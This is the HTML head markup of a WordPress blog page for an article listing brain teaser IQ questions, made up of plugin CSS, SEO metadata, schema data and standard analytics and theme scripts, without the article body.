0;padding:16px!important}.wc-block-components-notice-banner>svg{fill:#fff;background-color:#2f2f2f;border-radius:50%;flex-grow:0;flex-shrink:0;height:100%;padding:2px}.wc-block-components-notice-banner:focus{outline-width:0}.wc-block-components-notice-banner:focus-visible{outline-style:solid;outline-width:2px}#pms_login input[type=email],#pms_login input[type=password],#pms_login input[type=text],.pms-form input[type=email],.pms-form input[type=password],.pms-form input[type=text],.pms-form input[type=textarea],textarea{width:100%}#pms_login p{margin-bottom:16px}.pms-form>input[type=submit]{margin-right:20px}.pms-form{margin-bottom:1em}.pms-field{margin:0;margin-bottom:20px}.pms-field input[type=checkbox],.pms-field input[type=radio]{margin-right:7px}.pms-submit-disabled{cursor:wait!important}.pms_field-errors-wrapper p{font-size:90%;color:#c0392b}.pms-billing-state__select{display:none}.pms-subscription-plan{margin-bottom:1.345em}.pms-subscription-plan input{margin-right:7px}.pms-subscription-plan input,.pms-subscription-plan label{cursor:pointer}.wppb-form-field.wppb-subscription-plans label{width:100%;float:none}.wppb-form-field.wppb-subscription-plans input{display:inline-block;float:none;margin-right:7px!important}.wppb-form-field.wppb-subscription-plans span.description{display:block;font-size:100%;font-style:italic;margin-left:0;margin-bottom:1.5em}.wppb-form-field.wppb-subscription-plans h4{margin-bottom:16px}.wppb-user-forms .pms-billing-details input[type=text]{width:100%}#pms-paygates-wrapper{margin-bottom:1em}#pms-paygates-wrapper h3{margin-bottom:16px}#pms-paygates-inner{visibility:hidden;display:flex;flex-direction:row;align-items:center;justify-content:flex-start;flex-wrap:wrap;gap:30px}#pms-paygates-inner>label{display:inline-flex;align-items:center;cursor:pointer;margin:0;background-color:#fff}#pms-paygates-inner input{appearance:none;display:none}#pms-paygates-inner input+span{border:1px solid #cfd4de;width:136px;height:56px;box-sizing:border-box;display:flex;align-items:center;justify-content:center}#pms-paygates-inner input+span:hover,#pms-paygates-inner input:checked+span{border-color:#0056ba}#pms-paygates-inner input[value=manual]+span{font-style:normal;font-weight:500;font-size:14px;color:#090a0b}#pms-paygates-inner input[value=paypal_connect]+span,#pms-paygates-inner input[value=paypal_express]+span,#pms-paygates-inner input[value=paypal_pro]+span,#pms-paygates-inner input[value=paypal_standard]+span{font-size:0;background:url("https://cdn.learnwoo.com/wp-content/plugins/paid-member-subscriptions/assets/images/PayPal-payment-icon.svg") center center no-repeat}#pms-paygates-inner input[value=stripe_connect]+span,#pms-paygates-inner input[value=stripe_intents]+span{font-size:0;background:url("https://cdn.learnwoo.com/wp-content/plugins/paid-member-subscriptions/assets/images/CreditCard-payment-icon.svg") center center no-repeat}#pms-gateways-not-available{background:rgba(52,152,219,.25);border:1px solid rgba(52,152,219,.85);color:#2980b9;padding:.5em .75em;margin:1em 0}#pms-gateways-not-available{display:none}.pms-paygate-extra-fields{display:none}.pms-subscription-plan-auto-renew{margin-bottom:1em}.pms-subscription-plan-auto-renew input[type=checkbox]{margin-right:7px}.pms-subscription-plan-auto-renew label{display:flex;align-items:center;justify-content:flex-start;gap:7px;cursor:pointer}.pms-subscription-plan-auto-renew label input[type=checkbox],.wppb-form-field.wppb-subscription-plans .pms-subscription-plan-auto-renew label input[type=checkbox]{margin:0!important;margin-right:4px!important}#pms-submit-button-loading-placeholder-text{display:none}.wppb-form-field #pms_billing_country,.wppb-form-field #pms_billing_state,.wppb-form-field .pms-billing-details input[type=text]{width:69.9%}.pms-subscription-plan-price__recurring{display:none}#pms-update-payment-method-form .pms_field-errors-wrapper{margin-bottom:24px}.pms-field .pms_pwyw_pricing{display:inline-block;margin-left:5px}.pms-spinner__holder{display:flex;align-items:center;justify-content:center;width:100%;height:80px}#pms_billing_country{width:100%}.StripeElement{box-sizing:border-box;padding:10px 12px;border:1px solid #cfd7df;border-radius:4px;background-color:#fff;box-shadow:0 1px 3px 0 #e6ebf1;-webkit-transition:box-shadow 150ms;transition:box-shadow 150ms ease}.StripeElement--focus{box-shadow:0 1px 3px 0 #cfd7df}.StripeElement--invalid{border-color:#fb1427}.StripeElement--webkit-autofill{background-color:#fefde5!important}@keyframes spin{to{-webkit-transform:rotate(360deg)}}@-webkit-keyframes spin{to{-webkit-transform:rotate(360deg)}}.pms-stripe-error-message{font-size:16px;color:#fb1427;margin-top:8px}.wppb-user-forms .pms-paygate-extra-fields-stripe_connect{margin-bottom:24px}.pms-stripe-error-message+.pms_field-errors-wrapper{display:none}#payment-request-button.StripeElement,#pms-stripe-payment-elements.StripeElement{height:auto;border:0;border-radius:0;padding:0;box-shadow:none;-webkit-transition:none;transition:none}.pms-form #payment-request-button{margin-bottom:18px}#pms-stripe-payment-elements{max-width:500px;margin-bottom:16px}#pms_subscription_plans_discount_code{width:50%}#pms-subscription-plans-discount-messages-wrapper{display:none;padding:1em;margin:1em 0;margin-top:0;border:1px solid #e7e7e7}#pms-subscription-plans-discount-messages{display:none}#pms-subscription-plans-discount-messages-loading{display:none}.pms-discount-error{color:#c0392b;font-size:80%}.pms-discount-success{color:green}#pms-ec-register-form #pms-subscription-plans-discount,.wppb-subscription-plans #pms-subscription-plans-discount{margin-bottom:20px}#pms-subscription-plans-discount{margin-bottom:1em}#pms-paygate-extra-fields-paypal_connect__placeholder{max-width:200px}.logged-in #pms-paygate-extra-fields-paypal_connect__placeholder{max-width:250px}#pms-paypal-connect{margin-bottom:16px}.pms-billing-details{display:none;flex-wrap:wrap;gap:18px}.pms-billing-details .pms-field{margin-bottom:0;width:100%}.pms-billing-details h3{margin-bottom:10px}</style><link rel="preload" data-rocket-preload as="image" href="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-696x392.png" imagesrcset="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-696x392.png 696w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-300x169.png 300w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-1024x576.png 1024w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-768x432.png 768w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-1068x601.png 1068w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-747x420.png 747w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser-600x338.png 600w, https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png 1120w" imagesizes="(max-width: 696px) 100vw, 696px" fetchpriority="high">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="pingback" href="https://learnwoo.com/xmlrpc.php" />
    	<style></style>
	<link rel="icon" type="image/png" href="https://cdn.learnwoo.com/wp-content/uploads/2018/05/Learnwoo_favicon_16x16.png">
<!-- Search Engine Optimization by Rank Math - https://rankmath.com/ -->
<meta name="description" content="Explore 100+ brain teaser IQ questions, including math puzzles, logic riddles, and vocabulary challenges. Test your IQ and critical thinking skills!"/>
<meta name="robots" content="index, follow, max-snippet:-1, max-video-preview:-1, max-image-preview:large"/>
<link rel="canonical" href="https://learnwoo.com/brain-teaser-iq-questions-and-answers/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="100+ Brain Teaser IQ Questions and Answers - LearnWoo" />
<meta property="og:description" content="Explore 100+ brain teaser IQ questions, including math puzzles, logic riddles, and vocabulary challenges. Test your IQ and critical thinking skills!" />
<meta property="og:url" content="https://learnwoo.com/brain-teaser-iq-questions-and-answers/" />
<meta property="og:site_name" content="LearnWoo" />
<meta property="article:publisher" content="https://www.facebook.com/learnwoo/" />
<meta property="article:tag" content="blog" />
<meta property="article:tag" content="brain teasers" />
<meta property="article:tag" content="IQ" />
<meta property="article:tag" content="iq test" />
<meta property="article:tag" content="mcq" />
<meta property="article:section" content="Blog" />
<meta property="og:updated_time" content="2024-11-22T21:40:54+05:30" />
<meta property="og:image" content="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png" />
<meta property="og:image:secure_url" content="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png" />
<meta property="og:image:width" content="1120" />
<meta property="og:image:height" content="630" />
<meta property="og:image:alt" content="Brain teaser IQ Questions" />
<meta property="og:image:type" content="image/png" />
<meta property="article:published_time" content="2024-11-22T21:33:30+05:30" />
<meta property="article:modified_time" content="2024-11-22T21:40:54+05:30" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="100+ Brain Teaser IQ Questions and Answers - LearnWoo" />
<meta name="twitter:description" content="Explore 100+ brain teaser IQ questions, including math puzzles, logic riddles, and vocabulary challenges. Test your IQ and critical thinking skills!" />
<meta name="twitter:site" content="@learnwoo_com" />
<meta name="twitter:creator" content="@learnwoo_com" />
<meta name="twitter:image" content="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png" />
<meta name="twitter:label1" content="Written by" />
<meta name="twitter:data1" content="Aswathy Ajaykumar" />
<meta name="twitter:label2" content="Time to read" />
<meta name="twitter:data2" content="13 minutes" />
<script type="application/ld+json" class="rank-math-schema">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://learnwoo.com/#organization","name":"Elula Tech Private Limited","url":"https://learnwoo.com","sameAs":["https://www.facebook.com/learnwoo/","https://twitter.com/learnwoo_com"],"logo":{"@type":"ImageObject","@id":"https://learnwoo.com/#logo","url":"https://learnwoo.com/wp-content/uploads/2022/08/LearnWoo-112x112-1.png","contentUrl":"https://learnwoo.com/wp-content/uploads/2022/08/LearnWoo-112x112-1.png","caption":"Elula Tech Private Limited","inLanguage":"en-US","width":"112","height":"112"}},{"@type":"WebSite","@id":"https://learnwoo.com/#website","url":"https://learnwoo.com","name":"Elula Tech Private Limited","publisher":{"@id":"https://learnwoo.com/#organization"},"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png","url":"https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png","width":"1120","height":"630","caption":"Brain teaser IQ Questions","inLanguage":"en-US"},{"@type":"WebPage","@id":"https://learnwoo.com/brain-teaser-iq-questions-and-answers/#webpage","url":"https://learnwoo.com/brain-teaser-iq-questions-and-answers/","name":"100+ Brain Teaser IQ Questions and Answers - LearnWoo","datePublished":"2024-11-22T21:33:30+05:30","dateModified":"2024-11-22T21:40:54+05:30","isPartOf":{"@id":"https://learnwoo.com/#website"},"primaryImageOfPage":{"@id":"https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png"},"inLanguage":"en-US"},{"@type":"Person","@id":"https://learnwoo.com/author/aswathyajaykumar/","name":"Aswathy Ajaykumar","url":"https://learnwoo.com/author/aswathyajaykumar/","image":{"@type":"ImageObject","@id":"https://learnwoo.com/wp-content/uploads/2024/05/WhatsApp-Image-2024-05-03-at-11.30.43-AM-100x100.jpeg","url":"https://learnwoo.com/wp-content/uploads/2024/05/WhatsApp-Image-2024-05-03-at-11.30.43-AM-100x100.jpeg","caption":"Aswathy Ajaykumar","inLanguage":"en-US"},"worksFor":{"@id":"https://learnwoo.com/#organization"}},{"@type":"BlogPosting","headline":"100+ Brain Teaser IQ Questions and Answers - LearnWoo","keywords":"brain teaser IQ questions,brain teaser,IQ questions","datePublished":"2024-11-22T21:33:30+05:30","dateModified":"2024-11-22T21:40:54+05:30","author":{"@id":"https://learnwoo.com/author/aswathyajaykumar/","name":"Aswathy Ajaykumar"},"publisher":{"@id":"https://learnwoo.com/#organization"},"description":"Explore 100+ brain teaser IQ questions, including math puzzles, logic riddles, and vocabulary challenges. Test your IQ and critical thinking skills!","name":"100+ Brain Teaser IQ Questions and Answers - LearnWoo","@id":"https://learnwoo.com/brain-teaser-iq-questions-and-answers/#richSnippet","isPartOf":{"@id":"https://learnwoo.com/brain-teaser-iq-questions-and-answers/#webpage"},"image":{"@id":"https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png"},"inLanguage":"en-US","mainEntityOfPage":{"@id":"https://learnwoo.com/brain-teaser-iq-questions-and-answers/#webpage"}}]}</script>
<!-- /Rank Math WordPress SEO plugin -->

<link rel='dns-prefetch' href='//www.googletagmanager.com' />

<link rel="alternate" type="application/rss+xml" title="LearnWoo &raquo; Feed" href="https://learnwoo.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="LearnWoo &raquo; Comments Feed" href="https://learnwoo.com/comments/feed/" />

<style id='wp-emoji-styles-inline-css' type='text/css'></style>

<style id='classic-theme-styles-inline-css' type='text/css'></style>
<style id='pms-content-restriction-start-style-inline-css' type='text/css'>


</style>
<style id='pms-content-restriction-end-style-inline-css' type='text/css'>


</style>
<style id='pms-account-style-inline-css' type='text/css'>


</style>
<style id='pms-login-style-inline-css' type='text/css'>


</style>
<style id='pms-recover-password-style-inline-css' type='text/css'>


</style>
<style id='pms-register-style-inline-css' type='text/css'>


</style>
<style id='global-styles-inline-css' type='text/css'></style>






<style id='woocommerce-inline-inline-css' type='text/css'></style>





<style id='ez-toc-inline-css' type='text/css'></style>




<style id='td-theme-inline-css' type='text/css'></style>




<style id='rocket-lazyload-inline-css' type='text/css'>
.rll-youtube-player{position:relative;padding-bottom:56.23%;height:0;overflow:hidden;max-width:100%;}.rll-youtube-player:focus-within{outline: 2px solid currentColor;outline-offset: 5px;}.rll-youtube-player iframe{position:absolute;top:0;left:0;width:100%;height:100%;z-index:100;background:0 0}.rll-youtube-player img{bottom:0;display:block;left:0;margin:auto;max-width:100%;width:100%;position:absolute;right:0;top:0;border:none;height:auto;-webkit-transition:.4s all;-moz-transition:.4s all;transition:.4s all}.rll-youtube-player img:hover{-webkit-filter:brightness(75%)}.rll-youtube-player .play{height:100%;width:100%;left:0;top:0;position:absolute;background:var(--wpr-bg-2804635b-c3a8-48c6-9f8a-18fbcc82a96b) no-repeat center;background-color: transparent !important;cursor:pointer;border:none;}
</style>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.7.0-wc.10.1.0" id="jquery-blockui-js" defer="defer" data-wp-strategy="defer"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4-wc.10.1.0" id="js-cookie-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" id="woocommerce-js-extra">
/* <![CDATA[ */
var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_password_show":"Show password","i18n_password_hide":"Hide password"};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=10.1.0" id="woocommerce-js" defer="defer" data-wp-strategy="defer"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/wp-user-avatar/assets/flatpickr/flatpickr.min.js?ver=4.16.5" id="ppress-flatpickr-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/wp-user-avatar/assets/select2/select2.min.js?ver=4.16.5" id="ppress-select2-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
<script type="text/javascript" id="wpm-js-extra">
/* <![CDATA[ */
var wpm = {"ajax_url":"https:\/\/learnwoo.com\/wp-admin\/admin-ajax.php","root":"https:\/\/learnwoo.com\/wp-json\/","nonce_wp_rest":"d706f4bd16","nonce_ajax":"5ad57fb089"};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/woocommerce-google-adwords-conversion-tracking-tag/js/public/wpm-public.p1.min.js?ver=1.49.1" id="wpm-js"></script>
<link rel="https://api.w.org/" href="https://learnwoo.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://learnwoo.com/wp-json/wp/v2/posts/58232" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://learnwoo.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.8.2" />
<link rel='shortlink' href='https://learnwoo.com/?p=58232' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://learnwoo.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flearnwoo.com%2Fbrain-teaser-iq-questions-and-answers%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://learnwoo.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flearnwoo.com%2Fbrain-teaser-iq-questions-and-answers%2F&#038;format=xml" />
<meta name="generator" content="Site Kit by Google 1.159.0" /><meta name="ir-site-verification-token" value="1184072712" />    <script type="rocketlazyloadscript">
        window.tdb_global_vars = {"wpRestUrl":"https:\/\/learnwoo.com\/wp-json\/","permalinkStructure":"\/%postname%\/"};
        window.tdb_p_autoload_vars = {"isAjax":false,"isAdminBarShowing":false,"autoloadStatus":"off","origPostEditUrl":null};
    </script>
    
    <style id="tdb-global-colors"></style>

    
		<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
	<meta name="generator" content="Elementor 3.31.2; features: additional_custom_breakpoints, e_element_cache; settings: css_print_method-external, google_font-enabled, font_display-auto">

<!-- START Pixel Manager for WooCommerce -->

		<script type="rocketlazyloadscript">

			window.wpmDataLayer = window.wpmDataLayer || {};
			window.wpmDataLayer = Object.assign(window.wpmDataLayer, {"cart":{},"cart_item_keys":{},"version":{"number":"1.49.1","pro":false,"eligible_for_updates":false,"distro":"fms","beta":false,"show":true},"pixels":{"google":{"linker":{"settings":null},"user_id":false,"analytics":{"ga4":{"measurement_id":"G-P6PFHLVS13","parameters":{},"mp_active":false,"debug_mode":false,"page_load_time_tracking":false},"id_type":"post_id"},"tag_id":"G-P6PFHLVS13","tag_gateway":{"measurement_path":""},"tcf_support":false,"consent_mode":{"is_active":false,"wait_for_update":500,"ads_data_redaction":false,"url_passthrough":true}}},"shop":{"list_name":"Blog Post | 100+ Brain Teaser IQ Questions and Answers","list_id":"blog_post_100-brain-teaser-iq-questions-and-answers","page_type":"blog_post","currency":"USD","selectors":{"addToCart":[],"beginCheckout":[]},"order_duplication_prevention":true,"view_item_list_trigger":{"test_mode":false,"background_color":"green","opacity":0.5,"repeat":true,"timeout":1000,"threshold":0.8},"variations_output":true,"session_active":false},"page":{"id":58232,"title":"100+ Brain Teaser IQ Questions and Answers","type":"post","categories":[{"term_id":166,"name":"Blog","slug":"blog","term_group":0,"term_taxonomy_id":166,"taxonomy":"category","description":"","parent":0,"count":1608,"filter":"raw","cat_ID":166,"category_count":1608,"category_description":"","cat_name":"Blog","category_nicename":"blog","category_parent":0},{"term_id":1959,"name":"Guide","slug":"guide","term_group":0,"term_taxonomy_id":1959,"taxonomy":"category","description":"","parent":0,"count":163,"filter":"raw","cat_ID":1959,"category_count":163,"category_description":"","cat_name":"Guide","category_nicename":"guide","category_parent":0},{"term_id":2831,"name":"IQ","slug":"iq","term_group":0,"term_taxonomy_id":2831,"taxonomy":"category","description":"","parent":0,"count":6,"filter":"raw","cat_ID":2831,"category_count":6,"category_description":"","cat_name":"IQ","category_nicename":"iq","category_parent":0},{"term_id":2829,"name":"IQ questions","slug":"iq-questions","term_group":0,"term_taxonomy_id":2829,"taxonomy":"category","description":"","parent":0,"count":6,"filter":"raw","cat_ID":2829,"category_count":6,"category_description":"","cat_name":"IQ questions","category_nicename":"iq-questions","category_parent":0},{"term_id":2830,"name":"Logical Reasoning","slug":"logical-reasoning","term_group":0,"term_taxonomy_id":2830,"taxonomy":"category","description":"","parent":0,"count":2,"filter":"raw","cat_ID":2830,"category_count":2,"category_description":"","cat_name":"Logical Reasoning","category_nicename":"logical-reasoning","category_parent":0}],"parent":{"id":0,"title":"100+ Brain Teaser IQ Questions and Answers","type":"post","categories":[{"term_id":166,"name":"Blog","slug":"blog","term_group":0,"term_taxonomy_id":166,"taxonomy":"category","description":"","parent":0,"count":1608,"filter":"raw","cat_ID":166,"category_count":1608,"category_description":"","cat_name":"Blog","category_nicename":"blog","category_parent":0},{"term_id":1959,"name":"Guide","slug":"guide","term_group":0,"term_taxonomy_id":1959,"taxonomy":"category","description":"","parent":0,"count":163,"filter":"raw","cat_ID":1959,"category_count":163,"category_description":"","cat_name":"Guide","category_nicename":"guide","category_parent":0},{"term_id":2831,"name":"IQ","slug":"iq","term_group":0,"term_taxonomy_id":2831,"taxonomy":"category","description":"","parent":0,"count":6,"filter":"raw","cat_ID":2831,"category_count":6,"category_description":"","cat_name":"IQ","category_nicename":"iq","category_parent":0},{"term_id":2829,"name":"IQ questions","slug":"iq-questions","term_group":0,"term_taxonomy_id":2829,"taxonomy":"category","description":"","parent":0,"count":6,"filter":"raw","cat_ID":2829,"category_count":6,"category_description":"","cat_name":"IQ questions","category_nicename":"iq-questions","category_parent":0},{"term_id":2830,"name":"Logical Reasoning","slug":"logical-reasoning","term_group":0,"term_taxonomy_id":2830,"taxonomy":"category","description":"","parent":0,"count":2,"filter":"raw","cat_ID":2830,"category_count":2,"category_description":"","cat_name":"Logical Reasoning","category_nicename":"logical-reasoning","category_parent":0}]}},"general":{"user_logged_in":false,"scroll_tracking_thresholds":[],"page_id":58232,"exclude_domains":[],"server_2_server":{"active":false,"ip_exclude_list":[],"pageview_event_s2s":{"is_active":false,"pixels":[]}},"consent_management":{"explicit_consent":false},"lazy_load_pmw":false}});

		</script>

		
<!-- END Pixel Manager for WooCommerce -->
			<style></style>
			
<!-- JS generated by theme -->

<script type="rocketlazyloadscript" data-rocket-type="text/javascript" id="td-generated-header-js">
    
    

	    var tdBlocksArray = []; //here we store all the items for the current page

	    // td_block class - each ajax block uses a object of this class for requests
	    function tdBlock() {
		    this.id = '';
		    this.block_type = 1; //block type id (1-234 etc)
		    this.atts = '';
		    this.td_column_number = '';
		    this.td_current_page = 1; //
		    this.post_count = 0; //from wp
		    this.found_posts = 0; //from wp
		    this.max_num_pages = 0; //from wp
		    this.td_filter_value = ''; //current live filter value
		    this.is_ajax_running = false;
		    this.td_user_action = ''; // load more or infinite loader (used by the animation)
		    this.header_color = '';
		    this.ajax_pagination_infinite_stop = ''; //show load more at page x
	    }

        // td_js_generator - mini detector
        ( function () {
            var htmlTag = document.getElementsByTagName("html")[0];

	        if ( navigator.userAgent.indexOf("MSIE 10.0") > -1 ) {
                htmlTag.className += ' ie10';
            }

            if ( !!navigator.userAgent.match(/Trident.*rv\:11\./) ) {
                htmlTag.className += ' ie11';
            }

	        if ( navigator.userAgent.indexOf("Edge") > -1 ) {
                htmlTag.className += ' ieEdge';
            }

            if ( /(iPad|iPhone|iPod)/g.test(navigator.userAgent) ) {
                htmlTag.className += ' td-md-is-ios';
            }

            var user_agent = navigator.userAgent.toLowerCase();
            if ( user_agent.indexOf("android") > -1 ) {
                htmlTag.className += ' td-md-is-android';
            }

            if ( -1 !== navigator.userAgent.indexOf('Mac OS X')  ) {
                htmlTag.className += ' td-md-is-os-x';
            }

            if ( /chrom(e|ium)/.test(navigator.userAgent.toLowerCase()) ) {
               htmlTag.className += ' td-md-is-chrome';
            }

            if ( -1 !== navigator.userAgent.indexOf('Firefox') ) {
                htmlTag.className += ' td-md-is-firefox';
            }

            if ( -1 !== navigator.userAgent.indexOf('Safari') && -1 === navigator.userAgent.indexOf('Chrome') ) {
                htmlTag.className += ' td-md-is-safari';
            }

            if( -1 !== navigator.userAgent.indexOf('IEMobile') ){
                htmlTag.className += ' td-md-is-iemobile';
            }

        })();

        var tdLocalCache = {};

        ( function () {
            "use strict";

            tdLocalCache = {
                data: {},
                remove: function (resource_id) {
                    delete tdLocalCache.data[resource_id];
                },
                exist: function (resource_id) {
                    return tdLocalCache.data.hasOwnProperty(resource_id) && tdLocalCache.data[resource_id] !== null;
                },
                get: function (resource_id) {
                    return tdLocalCache.data[resource_id];
                },
                set: function (resource_id, cachedData) {
                    tdLocalCache.remove(resource_id);
                    tdLocalCache.data[resource_id] = cachedData;
                }
            };
        })();

    
    
var td_viewport_interval_list=[{"limitBottom":767,"sidebarWidth":228},{"limitBottom":1018,"sidebarWidth":300},{"limitBottom":1140,"sidebarWidth":324}];
var tdc_is_installed="yes";
var tdc_domain_active=false;
var td_ajax_url="https:\/\/learnwoo.com\/wp-admin\/admin-ajax.php?td_theme_name=Newspaper&v=12.7.1";
var td_get_template_directory_uri="https:\/\/learnwoo.com\/wp-content\/plugins\/td-composer\/legacy\/common";
var tds_snap_menu="snap";
var tds_logo_on_sticky="show_header_logo";
var tds_header_style="7";
var td_please_wait="Please wait...";
var td_email_user_pass_incorrect="User or password incorrect!";
var td_email_user_incorrect="Email or username incorrect!";
var td_email_incorrect="Email incorrect!";
var td_user_incorrect="Username incorrect!";
var td_email_user_empty="Email or username empty!";
var td_pass_empty="Pass empty!";
var td_pass_pattern_incorrect="Invalid Pass Pattern!";
var td_retype_pass_incorrect="Retyped Pass incorrect!";
var tds_more_articles_on_post_enable="";
var tds_more_articles_on_post_time_to_wait="";
var tds_more_articles_on_post_pages_distance_from_top=0;
var tds_captcha="";
var tds_theme_color_site_wide="#4db2ec";
var tds_smart_sidebar="enabled";
var tdThemeName="Newspaper";
var tdThemeNameWl="Newspaper";
var td_magnific_popup_translation_tPrev="Previous (Left arrow key)";
var td_magnific_popup_translation_tNext="Next (Right arrow key)";
var td_magnific_popup_translation_tCounter="%curr% of %total%";
var td_magnific_popup_translation_ajax_tError="The content from %url% could not be loaded.";
var td_magnific_popup_translation_image_tError="The image #%curr% could not be loaded.";
var tdBlockNonce="ec82151f60";
var tdMobileMenu="enabled";
var tdMobileSearch="enabled";
var tdDateNamesI18n={"month_names":["January","February","March","April","May","June","July","August","September","October","November","December"],"month_names_short":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"day_names":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"day_names_short":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"]};
var tdb_modal_confirm="Save";
var tdb_modal_cancel="Cancel";
var tdb_modal_confirm_alt="Yes";
var tdb_modal_cancel_alt="No";
var td_deploy_mode="deploy";
var td_ad_background_click_link="";
var td_ad_background_click_target="";
</script>


<!-- Header style compiled by theme -->

<style></style>

<script type="rocketlazyloadscript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-87915634-1', 'auto');
  ga('send', 'pageview');

</script>

<link rel="icon" href="https://cdn.learnwoo.com/wp-content/uploads/2018/05/cropped-Learnwoo_favicon_184x184-32x32.png" sizes="32x32" />
<link rel="icon" href="https://cdn.learnwoo.com/wp-content/uploads/2018/05/cropped-Learnwoo_favicon_184x184-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://cdn.learnwoo.com/wp-content/uploads/2018/05/cropped-Learnwoo_favicon_184x184-180x180.png" />
<meta name="msapplication-TileImage" content="https://cdn.learnwoo.com/wp-content/uploads/2018/05/cropped-Learnwoo_favicon_184x184-270x270.png" />
		<style type="text/css" id="wp-custom-css"></style>
		
<!-- Button style compiled by theme -->

<style></style>

	<style id="tdw-css-placeholder"></style><noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript><style id="rocket-lazyrender-inline-css">[data-wpr-lazyrender] {content-visibility: auto;}</style><style id="wpr-lazyload-bg-container"></style><style id="wpr-lazyload-bg-exclusion"></style>
<noscript>
<style id="wpr-lazyload-bg-nostyle">.rll-youtube-player .play{--wpr-bg-2804635b-c3a8-48c6-9f8a-18fbcc82a96b: url('https://cdn.learnwoo.com/wp-content/plugins/wp-rocket/assets/img/youtube.png');}</style>
</noscript>
<script type="application/javascript">const rocket_pairs = [{"selector":".rll-youtube-player .play","style":".rll-youtube-player .play{--wpr-bg-2804635b-c3a8-48c6-9f8a-18fbcc82a96b: url('https:\/\/cdn.learnwoo.com\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"2804635b-c3a8-48c6-9f8a-18fbcc82a96b","url":"https:\/\/cdn.learnwoo.com\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png"}]; const rocket_excluded_pairs = [];</script><meta name="generator" content="WP Rocket 3.19.3" data-wpr-features="wpr_lazyload_css_bg_img wpr_remove_unused_css wpr_delay_js wpr_lazyload_images wpr_lazyload_iframes wpr_preconnect_external_domains wpr_automatic_lazy_rendering wpr_oci wpr_cdn wpr_desktop" /></head>

